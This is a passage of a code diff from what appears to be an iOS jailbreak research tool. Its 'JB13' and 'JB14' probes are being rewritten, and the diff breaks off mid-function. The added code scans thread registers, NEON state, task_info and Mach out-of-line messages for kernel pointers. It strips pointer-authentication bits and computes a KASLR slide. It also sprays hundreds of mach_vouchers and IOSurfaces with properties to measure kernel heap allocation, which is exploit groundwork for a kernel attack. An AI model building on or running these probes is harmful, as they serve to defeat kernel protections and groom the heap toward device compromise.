@@ -25052,14 +25052,20 @@ void iosurface_kernel_info_harvest(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnu
     });
 }
 
-#pragma mark - Probe JB13: Exception Port Kernel Pointer Leak
+#pragma mark - Probe JB13: Deep Thread State + PAC Pointer Analysis
 
-static volatile int g_jb13_fault_done = 0;
+static volatile int g_jb13_workers_run = 1;
 
-static void *jb13_fault_thread(void *arg) {
+static void *jb13_worker_thread(void *arg) {
     (void)arg;
-    volatile uint32_t *bad = (volatile uint32_t *)0x41414141UL;
-    (void)*bad;
+    while (g_jb13_workers_run) {
+        mach_absolute_time();
+        (void)mach_thread_self();
+        thread_switch(MACH_PORT_NULL, SWITCH_OPTION_DEPRESS, 1);
+        sched_yield();
+        (void)mach_task_self();
+        (void)mach_host_self();
+    }
     return NULL;
 }
 
@@ -25067,232 +25073,305 @@ void iosurface_exc_port_leak(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull don
     atomic_store(&g_isr_stop, false);
     dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
         log(@"[JB13] ========================================");
-        log(@"[JB13] Exception Port Kernel Pointer Leak");
-        log(@"[JB13] Crash controlado + Mach exception message scan");
+        log(@"[JB13] Deep Thread State + PAC Pointer Analysis");
+        log(@"[JB13] All thread registers + PAC strip + syscall residue");
         log(@"[JB13] ========================================");
 
         int kernTextPtrs = 0;
         int kernHeapPtrs = 0;
+        int pacPtrs = 0;
         uint64_t bestKernPtr = 0;
         uint64_t kaslrSlide = 0;
+        int totalThreads = 0;
 
         if (!isr_stopped()) {
-            log(@"[JB13] --- Paso 1: Crear exception port ---");
-            mach_port_t excPort = MACH_PORT_NULL;
-            kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &excPort);
-            if (kr != KERN_SUCCESS) {
-                log([NSString stringWithFormat:@"[JB13] mach_port_allocate failed: %d", kr]);
-                done(@{@"error": @"port_alloc_failed"});
-                return;
+            log(@"[JB13] --- Paso 1: Spawn 8 worker threads for syscall residue ---");
+            g_jb13_workers_run = 1;
+            pthread_t *workers = (pthread_t *)calloc(8, sizeof(pthread_t));
+            if (workers) {
+                for (int i = 0; i < 8; i++) {
+                    pthread_create(&workers[i], NULL, jb13_worker_thread, NULL);
+                }
             }
-            kr = mach_port_insert_right(mach_task_self(), excPort, excPort, MACH_MSG_TYPE_MAKE_SEND);
-            if (kr != KERN_SUCCESS) {
-                log([NSString stringWithFormat:@"[JB13] insert_right failed: %d", kr]);
-                done(@{@"error": @"insert_right_failed"});
-                return;
-            }
-            log([NSString stringWithFormat:@"[JB13] Exception port: 0x%x", excPort]);
+            usleep(50000);
 
             if (!isr_stopped()) {
-                log(@"[JB13] --- Paso 2: Set task exception ports ---");
-                kr = task_set_exception_ports(mach_task_self(),
-                    EXC_MASK_BAD_ACCESS,
-                    excPort,
-                    (exception_behavior_t)(EXCEPTION_STATE_IDENTITY | MACH_EXCEPTION_CODES),
-                    ARM_THREAD_STATE64);
-                log([NSString stringWithFormat:@"[JB13] task_set_exception_ports kr=%d", kr]);
+                log(@"[JB13] --- Paso 2: Enumerate all task threads ---");
+                thread_act_array_t threads = NULL;
+                mach_msg_type_number_t threadCount = 0;
+                kern_return_t kr = task_threads(mach_task_self(), &threads, &threadCount);
+                log([NSString stringWithFormat:@"[JB13] task_threads: %u threads (kr=%d)", threadCount, kr]);
+                totalThreads = (int)threadCount;
 
-                if (kr == KERN_SUCCESS && !isr_stopped()) {
-                    log(@"[JB13] --- Paso 3: Spawn faulting thread ---");
-                    g_jb13_fault_done = 0;
-                    pthread_t ft;
-                    pthread_create(&ft, NULL, jb13_fault_thread, NULL);
-                    pthread_detach(ft);
+                if (kr == KERN_SUCCESS && threads && !isr_stopped()) {
+                    log(@"[JB13] --- Paso 3: Read ARM64 state from each thread ---");
 
-                    log(@"[JB13] --- Paso 4: Receive exception message ---");
-                    uint8_t *msgBuf = (uint8_t *)calloc(1, 8192);
-                    if (msgBuf) {
-                        mach_msg_header_t *hdr = (mach_msg_header_t *)msgBuf;
-                        hdr->msgh_size = 8192;
-                        hdr->msgh_local_port = excPort;
-                        kr = mach_msg(hdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, 8192, excPort, 2000, MACH_PORT_NULL);
-                        log([NSString stringWithFormat:@"[JB13] mach_msg receive kr=%d msgSize=%u msgId=%d",
-                             kr, hdr->msgh_size, hdr->msgh_id]);
-
-                        if (kr == KERN_SUCCESS && !isr_stopped()) {
-                            log([NSString stringWithFormat:@"[JB13] remote_port=0x%x local_port=0x%x bits=0x%x",
-                                 hdr->msgh_remote_port, hdr->msgh_local_port, hdr->msgh_bits]);
-
-                            uint32_t msgLen = hdr->msgh_size;
-                            if (msgLen > 8192) msgLen = 8192;
-                            log([NSString stringWithFormat:@"[JB13] --- Paso 5: Scan %u bytes for kernel pointers ---", msgLen]);
-
-                            for (uint32_t off = 0; off + 8 <= msgLen; off += 4) {
-                                uint64_t v = 0;
-                                memcpy(&v, msgBuf + off, 8);
-                                if ((v & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL && v != 0xFFFFFFFFFFFFFFFFULL) {
-                                    if (v < 0xFFFFFFF800000000ULL) {
-                                        kernTextPtrs++;
-                                        log([NSString stringWithFormat:@"[JB13] KERNEL TEXT at offset %u: 0x%llx", off, (unsigned long long)v]);
-                                        if (bestKernPtr == 0) bestKernPtr = v;
-                                    } else {
-                                        kernHeapPtrs++;
-                                        log([NSString stringWithFormat:@"[JB13] KERNEL HEAP at offset %u: 0x%llx", off, (unsigned long long)v]);
-                                        if (bestKernPtr == 0) bestKernPtr = v;
-                                    }
-                                }
-                            }
-
-                            // Also dump first 256 bytes as hex for manual analysis
-                            if (!isr_stopped()) {
-                                uint32_t dumpLen = msgLen < 256 ? msgLen : 256;
-                                NSMutableString *hex = [NSMutableString string];
-                                for (uint32_t i = 0; i < dumpLen; i++) {
-                                    if (i > 0 && i % 32 == 0) {
-                                        log([NSString stringWithFormat:@"[JB13] MSG+%03u: %@", i - 32, hex]);
-                                        hex = [NSMutableString string];
-                                    }
-                                    [hex appendFormat:@"%02x", msgBuf[i]];
-                                }
-                                if (hex.length > 0) {
-                                    log([NSString stringWithFormat:@"[JB13] MSG+%03u: %@", (dumpLen / 32) * 32, hex]);
-                                }
-                            }
-
-                            // Reply to terminate faulting thread
-                            typedef struct {
-                                mach_msg_header_t Head;
-                                NDR_record_t NDR;
-                                kern_return_t RetCode;
-                                int flavor;
-                                mach_msg_type_number_t new_stateCnt;
-                                natural_t new_state[68];
-                            } exc_reply_t;
-                            exc_reply_t reply;
-                            memset(&reply, 0, sizeof(reply));
-                            reply.Head.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MOVE_SEND_ONCE, 0);
-                            reply.Head.msgh_size = sizeof(reply);
-                            reply.Head.msgh_remote_port = hdr->msgh_remote_port;
-                            reply.Head.msgh_local_port = MACH_PORT_NULL;
-                            reply.Head.msgh_id = hdr->msgh_id + 100;
-                            reply.NDR = NDR_record;
-                            reply.RetCode = KERN_SUCCESS;
-                            reply.flavor = ARM_THREAD_STATE64;
-                            reply.new_stateCnt = 68;
-                            mach_msg(&reply.Head, MACH_SEND_MSG | MACH_SEND_TIMEOUT, sizeof(reply), 0, MACH_PORT_NULL, 1000, MACH_PORT_NULL);
-                        } else if (kr != KERN_SUCCESS) {
-                            log([NSString stringWithFormat:@"[JB13] Exception message receive failed/timeout kr=%d", kr]);
+                    for (uint32_t t = 0; t < threadCount && !isr_stopped(); t++) {
+                        arm_thread_state64_t state;
+                        mach_msg_type_number_t cnt = ARM_THREAD_STATE64_COUNT;
+                        kr = thread_get_state(threads[t], ARM_THREAD_STATE64, (thread_state_t)&state, &cnt);
+                        if (kr != KERN_SUCCESS) {
+                            mach_port_deallocate(mach_task_self(), threads[t]);
+                            continue;
                         }
-                        free(msgBuf);
+
+                        uint64_t *regs = (uint64_t *)calloc(34, sizeof(uint64_t));
+                        if (!regs) {
+                            mach_port_deallocate(mach_task_self(), threads[t]);
+                            continue;
+                        }
+                        for (int r = 0; r < 29; r++) regs[r] = state.__x[r];
+                        regs[29] = (uint64_t)state.__fp;
+                        regs[30] = (uint64_t)state.__lr;
+                        regs[31] = (uint64_t)state.__sp;
+                        regs[32] = (uint64_t)state.__pc;
+                        regs[33] = state.__cpsr;
+
+                        for (int r = 0; r < 33; r++) {
+                            uint64_t v = regs[r];
+                            if (v == 0 || v == 0xFFFFFFFFFFFFFFFFULL) continue;
+
+                            if ((v & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                                if (v < 0xFFFFFFF800000000ULL) {
+                                    kernTextPtrs++;
+                                    log([NSString stringWithFormat:@"[JB13] KERNEL_TEXT thread[%u] reg[%d]=0x%llx", t, r, (unsigned long long)v]);
+                                    if (bestKernPtr == 0) bestKernPtr = v;
+                                } else {
+                                    kernHeapPtrs++;
+                                    log([NSString stringWithFormat:@"[JB13] KERNEL_HEAP thread[%u] reg[%d]=0x%llx", t, r, (unsigned long long)v]);
+                                    if (bestKernPtr == 0) bestKernPtr = v;
+                                }
+                            }
+
+                            uint64_t topByte = (v >> 48) & 0xFFFF;
+                            if (topByte != 0 && topByte != 0x0001 && topByte != 0xFFFF) {
+                                pacPtrs++;
+                                uint64_t stripped = v | 0xFFFF000000000000ULL;
+                                uint64_t stripped2 = v & 0x0000FFFFFFFFFFFFULL;
+                                if (pacPtrs <= 20) {
+                                    log([NSString stringWithFormat:@"[JB13] PAC thread[%u] reg[%d]=0x%llx top=0x%04llx stripped_kern=0x%llx stripped_user=0x%llx",
+                                         t, r, (unsigned long long)v, (unsigned long long)topByte,
+                                         (unsigned long long)stripped, (unsigned long long)stripped2]);
+                                }
+                                if ((stripped & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                                    kernTextPtrs++;
+                                    log([NSString stringWithFormat:@"[JB13] PAC_STRIP_KERNEL thread[%u] reg[%d] raw=0x%llx -> kern=0x%llx",
+                                         t, r, (unsigned long long)v, (unsigned long long)stripped]);
+                                    if (bestKernPtr == 0) bestKernPtr = stripped;
+                                }
+                            }
+                        }
+                        free(regs);
+
+                        if (!isr_stopped()) {
+                            arm_neon_state64_t neon;
+                            mach_msg_type_number_t neonCnt = ARM_NEON_STATE64_COUNT;
+                            kr = thread_get_state(threads[t], ARM_NEON_STATE64, (thread_state_t)&neon, &neonCnt);
+                            if (kr == KERN_SUCCESS) {
+                                for (int q = 0; q < 32; q++) {
+                                    uint64_t lo = (uint64_t)(neon.__v[q] & 0xFFFFFFFFFFFFFFFFULL);
+                                    uint64_t hi = (uint64_t)((neon.__v[q] >> 64) & 0xFFFFFFFFFFFFFFFFULL);
+                                    for (int half = 0; half < 2; half++) {
+                                        uint64_t val = half == 0 ? lo : hi;
+                                        if (val == 0 || val == 0xFFFFFFFFFFFFFFFFULL) continue;
+                                        if ((val & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                                            kernTextPtrs++;
+                                            log([NSString stringWithFormat:@"[JB13] NEON_KERN thread[%u] q%d.%s=0x%llx",
+                                                 t, q, half == 0 ? "lo" : "hi", (unsigned long long)val]);
+                                            if (bestKernPtr == 0) bestKernPtr = val;
+                                        }
+                                    }
+                                }
+                            }
+                        }
+
+                        mach_port_deallocate(mach_task_self(), threads[t]);
+                    }
+                    vm_deallocate(mach_task_self(), (vm_address_t)threads, threadCount * sizeof(thread_act_t));
+                }
+            }
+
+            g_jb13_workers_run = 0;
+            usleep(20000);
+            if (workers) {
+                for (int i = 0; i < 8; i++) {
+                    pthread_join(workers[i], NULL);
+                }
+                free(workers);
+            }
+
+            if (!isr_stopped()) {
+                log(@"[JB13] --- Paso 4: task_info residue scan ---");
+                struct task_basic_info_64 tbi;
+                mach_msg_type_number_t tbiCnt = TASK_BASIC_INFO_64_COUNT;
+                kern_return_t kr = task_info(mach_task_self(), TASK_BASIC_INFO_64, (task_info_t)&tbi, &tbiCnt);
+                if (kr == KERN_SUCCESS) {
+                    uint64_t *raw = (uint64_t *)&tbi;
+                    uint32_t words = sizeof(tbi) / 8;
+                    for (uint32_t w = 0; w < words; w++) {
+                        if ((raw[w] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL && raw[w] != 0xFFFFFFFFFFFFFFFFULL) {
+                            kernTextPtrs++;
+                            log([NSString stringWithFormat:@"[JB13] TASK_INFO kern ptr at word %u: 0x%llx", w, (unsigned long long)raw[w]]);
+                            if (bestKernPtr == 0) bestKernPtr = raw[w];
+                        }
                     }
                 }
 
-                // Restore default exception ports
-                task_set_exception_ports(mach_task_self(), EXC_MASK_BAD_ACCESS, MACH_PORT_NULL,
-                    EXCEPTION_DEFAULT, ARM_THREAD_STATE64);
+                struct task_thread_times_info tti;
+                mach_msg_type_number_t ttiCnt = TASK_THREAD_TIMES_INFO_COUNT;
+                kr = task_info(mach_task_self(), TASK_THREAD_TIMES_INFO, (task_info_t)&tti, &ttiCnt);
+                if (kr == KERN_SUCCESS) {
+                    uint64_t *raw = (uint64_t *)&tti;
+                    uint32_t words = sizeof(tti) / 8;
+                    for (uint32_t w = 0; w < words; w++) {
+                        if ((raw[w] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL && raw[w] != 0xFFFFFFFFFFFFFFFFULL) {
+                            kernTextPtrs++;
+                            log([NSString stringWithFormat:@"[JB13] THREAD_TIMES kern ptr at word %u: 0x%llx", w, (unsigned long long)raw[w]]);
+                            if (bestKernPtr == 0) bestKernPtr = raw[w];
+                        }
+                    }
+                }
             }
-            mach_port_deallocate(mach_task_self(), excPort);
+
+            if (!isr_stopped()) {
+                log(@"[JB13] --- Paso 5: Mach message OOL descriptor scan ---");
+                for (int round = 0; round < 4 && !isr_stopped(); round++) {
+                    mach_port_t p = MACH_PORT_NULL;
+                    kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p);
+                    if (kr != KERN_SUCCESS) continue;
+                    kr = mach_port_insert_right(mach_task_self(), p, p, MACH_MSG_TYPE_MAKE_SEND);
+                    if (kr != KERN_SUCCESS) { mach_port_deallocate(mach_task_self(), p); continue; }
+
+                    struct {
+                        mach_msg_header_t hdr;
+                        mach_msg_body_t body;
+                        mach_msg_ool_descriptor_t ool;
+                        uint32_t pad[8];
+                    } sendMsg;
+                    memset(&sendMsg, 0, sizeof(sendMsg));
+                    uint8_t data[64];
+                    memset(data, 0xAA + round, sizeof(data));
+                    sendMsg.hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, MACH_MSG_TYPE_MAKE_SEND);
+                    sendMsg.hdr.msgh_size = sizeof(sendMsg);
+                    sendMsg.hdr.msgh_remote_port = p;
+                    sendMsg.hdr.msgh_local_port = p;
+                    sendMsg.hdr.msgh_id = 0x1337 + round;
+                    sendMsg.body.msgh_descriptor_count = 1;
+                    sendMsg.ool.address = data;
+                    sendMsg.ool.size = sizeof(data);
+                    sendMsg.ool.deallocate = 0;
+                    sendMsg.ool.copy = MACH_MSG_VIRTUAL_COPY;
+                    sendMsg.ool.type = MACH_MSG_OOL_DESCRIPTOR;
+
+                    kr = mach_msg(&sendMsg.hdr, MACH_SEND_MSG | MACH_SEND_TIMEOUT, sizeof(sendMsg), 0, MACH_PORT_NULL, 100, MACH_PORT_NULL);
+                    if (kr == KERN_SUCCESS) {
+                        uint8_t *rcvBuf = (uint8_t *)calloc(1, 512);
+                        if (rcvBuf) {
+                            mach_msg_header_t *rhdr = (mach_msg_header_t *)rcvBuf;
+                            kr = mach_msg(rhdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, 512, p, 100, MACH_PORT_NULL);
+                            if (kr == KERN_SUCCESS) {
+                                uint32_t rcvLen = rhdr->msgh_size;
+                                if (rcvLen > 512) rcvLen = 512;
+                                for (uint32_t off = 0; off + 8 <= rcvLen; off += 4) {
+                                    uint64_t v = 0;
+                                    memcpy(&v, rcvBuf + off, 8);
+                                    if ((v & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL && v != 0xFFFFFFFFFFFFFFFFULL) {
+                                        kernTextPtrs++;
+                                        log([NSString stringWithFormat:@"[JB13] OOL_MSG round%d offset %u: 0x%llx", round, off, (unsigned long long)v]);
+                                        if (bestKernPtr == 0) bestKernPtr = v;
+                                    }
+                                }
+                            }
+                            free(rcvBuf);
+                        }
+                    }
+                    mach_port_destroy(mach_task_self(), p);
+                }
+            }
         }
 
-        if (bestKernPtr != 0 && bestKernPtr < 0xFFFFFFF800000000ULL) {
+        if (bestKernPtr != 0 && (bestKernPtr & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL && bestKernPtr < 0xFFFFFFF800000000ULL) {
             kaslrSlide = bestKernPtr - 0xFFFFFFF007004000ULL;
         }
 
         log(@"[JB13] ========================================");
-        log([NSString stringWithFormat:@"[JB13] RESULTADO: kernText=%d kernHeap=%d bestPtr=0x%llx slide=0x%llx",
-             kernTextPtrs, kernHeapPtrs, (unsigned long long)bestKernPtr, (unsigned long long)kaslrSlide]);
+        log([NSString stringWithFormat:@"[JB13] RESULTADO: threads=%d kernText=%d kernHeap=%d pacPtrs=%d bestPtr=0x%llx slide=0x%llx",
+             totalThreads, kernTextPtrs, kernHeapPtrs, pacPtrs, (unsigned long long)bestKernPtr, (unsigned long long)kaslrSlide]);
         log(@"[JB13] ========================================");
 
         done(@{
+            @"totalThreads": @(totalThreads),
             @"kernelTextPtrs": @(kernTextPtrs),
             @"kernelHeapPtrs": @(kernHeapPtrs),
+            @"pacPointers": @(pacPtrs),
             @"bestKernelPtr": [NSString stringWithFormat:@"0x%llx", (unsigned long long)bestKernPtr],
             @"kaslrSlide": [NSString stringWithFormat:@"0x%llx", (unsigned long long)kaslrSlide]
         });
     });
 }
 
-#pragma mark - Probe JB14: Zone Info + Voucher Spray
-
-typedef struct { char zn_name[80]; } jb14_zone_name_t;
-typedef struct {
-    uint64_t zi_count;
-    uint64_t zi_cur_size;
-    uint64_t zi_max_size;
-    uint64_t zi_elem_size;
-    uint64_t zi_alloc_size;
-    uint64_t zi_sum_size;
-    uint64_t zi_exhaustible;
-    uint64_t zi_collectable;
-} jb14_zone_info_t;
+#pragma mark - Probe JB14: Voucher Spray + Heap Measurement Oracle
 
 void iosurface_zone_voucher_spray(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
     atomic_store(&g_isr_stop, false);
     dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
         log(@"[JB14] ========================================");
-        log(@"[JB14] Kernel Zone Info + Voucher Spray");
-        log(@"[JB14] host_zone_info layout + mach_voucher spray oracle");
+        log(@"[JB14] Voucher Spray + Heap Measurement Oracle");
+        log(@"[JB14] task_vm_info deltas + voucher/IOSurface cross-zone");
         log(@"[JB14] ========================================");
 
-        int totalZones = 0;
-        int interestingZones = 0;
         int voucherCount = 0;
-        int zoneDelta = 0;
+        int surfaceCount = 0;
+        int64_t voucherDeltaBytes = 0;
+        int64_t surfaceDeltaBytes = 0;
+        int64_t gcDeltaBytes = 0;
+        int portDelta = 0;
 
         if (!isr_stopped()) {
-            log(@"[JB14] --- Paso 1: host_zone_info (pre-spray) ---");
+            log(@"[JB14] --- Paso 1: Baseline task_vm_info ---");
+            typedef struct {
+                uint64_t virtual_size;
+                uint64_t resident_size;
+                uint64_t resident_size_peak;
+                uint64_t device;
+                uint64_t device_peak;
+                uint64_t internal;
+                uint64_t internal_peak;
+                uint64_t external;
+                uint64_t external_peak;
+                uint64_t reusable;
+                uint64_t reusable_peak;
+                uint64_t purgeable_volatile_pmap;
+                uint64_t purgeable_volatile_resident;
+                uint64_t purgeable_volatile_virtual;
+                uint64_t compressed;
+                uint64_t compressed_peak;
+                uint64_t compressed_lifetime;
+                uint64_t phys_footprint;
+                uint64_t min_address;
+                uint64_t max_address;
+                int64_t ledger_phys_footprint_peak;
+            } jb14_vm_info_t;
 
-            typedef kern_return_t (*HostZoneInfoFn)(host_t, jb14_zone_name_t **, mach_msg_type_number_t *,
-                                                     jb14_zone_info_t **, mach_msg_type_number_t *);
-            HostZoneInfoFn zoneInfoFn = (HostZoneInfoFn)dlsym(RTLD_DEFAULT, "host_zone_info");
+            jb14_vm_info_t vmPre;
+            memset(&vmPre, 0, sizeof(vmPre));
+            mach_msg_type_number_t vmCnt = sizeof(jb14_vm_info_t) / sizeof(natural_t);
+            kern_return_t kr = task_info(mach_task_self(), 22, (task_info_t)&vmPre, &vmCnt);
+            log([NSString stringWithFormat:@"[JB14] Baseline: phys_footprint=%llu internal=%llu compressed=%llu resident=%llu (kr=%d)",
+                 (unsigned long long)vmPre.phys_footprint, (unsigned long long)vmPre.internal,
+                 (unsigned long long)vmPre.compressed, (unsigned long long)vmPre.resident_size, kr]);
 
-            if (!zoneInfoFn) {
-                log(@"[JB14] host_zone_info not available via dlsym — skipping zone info");
-            }
-
-            jb14_zone_name_t *names1 = NULL;
-            mach_msg_type_number_t namesCnt1 = 0;
-            jb14_zone_info_t *info1 = NULL;
-            mach_msg_type_number_t infoCnt1 = 0;
-
-            kern_return_t kr = zoneInfoFn(mach_host_self(), &names1, &namesCnt1, &info1, &infoCnt1);
-            log([NSString stringWithFormat:@"[JB14] host_zone_info kr=%d zones=%u", kr, namesCnt1]);
-
-            uint64_t *preSizes = NULL;
-            if (kr == KERN_SUCCESS && namesCnt1 > 0) {
-                totalZones = (int)namesCnt1;
-                preSizes = (uint64_t *)calloc(namesCnt1, sizeof(uint64_t));
-
-                for (uint32_t i = 0; i < namesCnt1 && i < (uint32_t)infoCnt1; i++) {
-                    if (preSizes) preSizes[i] = info1[i].zi_cur_size;
-
-                    char *zn = names1[i].zn_name;
-                    BOOL interesting = NO;
-                    if (strstr(zn, "kalloc") || strstr(zn, "ipc.port") || strstr(zn, "ipc_kmsg") ||
-                        strstr(zn, "ipc.kmsg") || strstr(zn, "IOSurface") || strstr(zn, "vm_map") ||
-                        strstr(zn, "ipc_port") || strstr(zn, "task") || strstr(zn, "thread") ||
-                        strstr(zn, "voucher")) {
-                        interesting = YES;
-                        interestingZones++;
-                        if (!isr_stopped()) {
-                            log([NSString stringWithFormat:@"[JB14] ZONE[%u] '%s' elem=%llu count=%llu cur=%llu max=%llu",
-                                 i, zn, info1[i].zi_elem_size, info1[i].zi_count,
-                                 info1[i].zi_cur_size, info1[i].zi_max_size]);
-                        }
-                    }
-                }
-                log([NSString stringWithFormat:@"[JB14] Total: %d zones, %d interesting", totalZones, interestingZones]);
-            } else {
-                log([NSString stringWithFormat:@"[JB14] host_zone_info failed kr=%d — may need entitlement", kr]);
-            }
+            struct task_basic_info_64 tbiPre;
+            mach_msg_type_number_t tbiCnt = TASK_BASIC_INFO_64_COUNT;
+            task_info(mach_task_self(), TASK_BASIC_INFO_64, (task_info_t)&tbiPre, &tbiCnt);
 
             if (!isr_stopped()) {
-                log(@"[JB14] --- Paso 2: Spray 256 mach_vouchers ---");
+                log(@"[JB14] --- Paso 2: Spray 512 mach_vouchers ---");
                 typedef kern_return_t (*HostCreateVoucherFn)(host_t, mach_voucher_attr_raw_recipe_array_t,
                                                               mach_msg_type_number_t, mach_port_t *);
                 HostCreateVoucherFn createVoucher = (HostCreateVoucherFn)dlsym(RTLD_DEFAULT, "host_create_mach_voucher");
 
-                mach_port_t *vouchers = (mach_port_t *)calloc(256, sizeof(mach_port_t));
+                mach_port_t *vouchers = (mach_port_t *)calloc(512, sizeof(mach_port_t));
                 if (createVoucher && vouchers) {
                     struct {
                         uint32_t key;
@@ -25300,12 +25379,12 @@ void iosurface_zone_voucher_spray(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnul
                         uint32_t previous_voucher;
                         uint32_t content_size;
                     } recipe;
-                    recipe.key = 8; // MACH_VOUCHER_ATTR_KEY_ATM
-                    recipe.command = 2; // ATM_CREATE
+                    recipe.key = 8;
+                    recipe.command = 2;
                     recipe.previous_voucher = 0;
                     recipe.content_size = 0;
 
-                    for (int i = 0; i < 256 && !isr_stopped(); i++) {
+                    for (int i = 0; i < 512 && !isr_stopped(); i++) {
                         kr = createVoucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)&recipe,
                                            sizeof(recipe), &vouchers[i]);
                         if (kr == KERN_SUCCESS) {
@@ -25316,96 +25395,128 @@ void iosurface_zone_voucher_spray(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnul
                         }
                     }
                     log([NSString stringWithFormat:@"[JB14] Sprayed %d vouchers", voucherCount]);
+
+                    if (voucherCount > 0 && !isr_stopped()) {
+                        jb14_vm_info_t vmPost1;
+                        memset(&vmPost1, 0, sizeof(vmPost1));
+                        vmCnt = sizeof(jb14_vm_info_t) / sizeof(natural_t);
+                        task_info(mach_task_self(), 22, (task_info_t)&vmPost1, &vmCnt);
+                        voucherDeltaBytes = (int64_t)vmPost1.phys_footprint - (int64_t)vmPre.phys_footprint;
+                        portDelta = voucherCount;
+                        log([NSString stringWithFormat:@"[JB14] Post-voucher: phys_footprint=%llu delta=%+lld internal_delta=%+lld",
+                             (unsigned long long)vmPost1.phys_footprint, (long long)voucherDeltaBytes,
+                             (long long)((int64_t)vmPost1.internal - (int64_t)vmPre.internal)]);
+                        if (voucherCount > 0) {
+                            int64_t perVoucher = voucherDeltaBytes / voucherCount;
+                            log([NSString stringWithFormat:@"[JB14] Estimated per-voucher kernel alloc: %lld bytes", (long long)perVoucher]);
+                        }
+                    }
                 } else {
-                    log(@"[JB14] host_create_mach_voucher not available");
+                    log(@"[JB14] host_create_mach_voucher not available via dlsym");
                 }
 
-                if (!isr_stopped() && kr == KERN_SUCCESS && totalZones > 0) {
-                    log(@"[JB14] --- Paso 3: host_zone_info (post-spray) ---");
-                    jb14_zone_name_t *names2 = NULL;
-                    mach_msg_type_number_t namesCnt2 = 0;
-                    jb14_zone_info_t *info2 = NULL;
-                    mach_msg_type_number_t infoCnt2 = 0;
-
-                    kr = zoneInfoFn(mach_host_self(), &names2, &namesCnt2, &info2, &infoCnt2);
-                    if (kr == KERN_SUCCESS && preSizes) {
-                        for (uint32_t i = 0; i < namesCnt2 && i < namesCnt1 && i < (uint32_t)infoCnt2; i++) {
-                            int64_t delta = (int64_t)info2[i].zi_cur_size - (int64_t)preSizes[i];
-                            if (delta > 0 && !isr_stopped()) {
-                                char *zn = names2[i].zn_name;
-                                if (strstr(zn, "kalloc") || strstr(zn, "ipc") || strstr(zn, "voucher") ||
-                                    strstr(zn, "port") || strstr(zn, "task")) {
-                                    zoneDelta++;
-                                    log([NSString stringWithFormat:@"[JB14] DELTA[%u] '%s' grew +%lld bytes (cur=%llu)",
-                                         i, zn, (long long)delta, info2[i].zi_cur_size]);
+                if (!isr_stopped()) {
+                    log(@"[JB14] --- Paso 3: Spray 64 IOSurfaces with properties ---");
+                    ISRSymbols sym;
+                    if (isr_load(&sym)) {
+                        IOSurfaceRef *surfs = (IOSurfaceRef *)calloc(64, sizeof(IOSurfaceRef));
+                        if (surfs) {
+                            for (int i = 0; i < 64 && !isr_stopped(); i++) {
+                                NSDictionary *props = @{
+                                    @"IOSurfaceWidth": @(32),
+                                    @"IOSurfaceHeight": @(32),
+                                    @"IOSurfaceBytesPerElement": @(4),
+                                    @"IOSurfacePixelFormat": @(0x42475241)
+                                };
+                                surfs[i] = sym.create((__bridge CFDictionaryRef)props);
+                                if (surfs[i]) {
+                                    surfaceCount++;
+                                    CFStringRef key = (__bridge CFStringRef)[NSString stringWithFormat:@"jb14_spray_%d", i];
+                                    NSMutableData *val = [NSMutableData dataWithLength:256];
+                                    memset(val.mutableBytes, 0xBB + (i & 0xFF), 256);
+                                    typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
+                                    SetValueFn setVal = (SetValueFn)dlsym(RTLD_DEFAULT, "IOSurfaceSetValue");
+                                    if (setVal) {
+                                        setVal(surfs[i], key, (__bridge CFTypeRef)val);
+                                    }
                                 }
                             }
+                            log([NSString stringWithFormat:@"[JB14] Created %d IOSurfaces with properties", surfaceCount]);
+
+                            if (surfaceCount > 0 && !isr_stopped()) {
+                                jb14_vm_info_t vmPost2;
+                                memset(&vmPost2, 0, sizeof(vmPost2));
+                                vmCnt = sizeof(jb14_vm_info_t) / sizeof(natural_t);
+                                task_info(mach_task_self(), 22, (task_info_t)&vmPost2, &vmCnt);
+                                int64_t totalDelta = (int64_t)vmPost2.phys_footprint - (int64_t)vmPre.phys_footprint;
+                                surfaceDeltaBytes = totalDelta - voucherDeltaBytes;
+                                log([NSString stringWithFormat:@"[JB14] Post-surface: phys=%llu totalDelta=%+lld surfaceDelta=%+lld",
+                                     (unsigned long long)vmPost2.phys_footprint, (long long)totalDelta, (long long)surfaceDeltaBytes]);
+                                if (surfaceCount > 0) {
+                                    int64_t perSurface = surfaceDeltaBytes / surfaceCount;
+                                    log([NSString stringWithFormat:@"[JB14] Estimated per-surface kernel alloc: %lld bytes", (long long)perSurface]);
+                                }
+                            }
+
+                            for (int i = 0; i < 64; i++) {
+                                if (surfs[i]) CFRelease(surfs[i]);
+                            }
+                            free(surfs);
                         }
-                        log([NSString stringWithFormat:@"[JB14] %d zones grew after voucher spray", zoneDelta]);
+                        isr_unload(&sym);
                     }
-                    if (names2) vm_deallocate(mach_task_self(), (vm_address_t)names2, namesCnt2 * sizeof(jb14_zone_name_t));
-                    if (info2) vm_deallocate(mach_task_self(), (vm_address_t)info2, infoCnt2 * sizeof(jb14_zone_info_t));
                 }
 
-                // Deallocate vouchers
-                if (vouchers) {
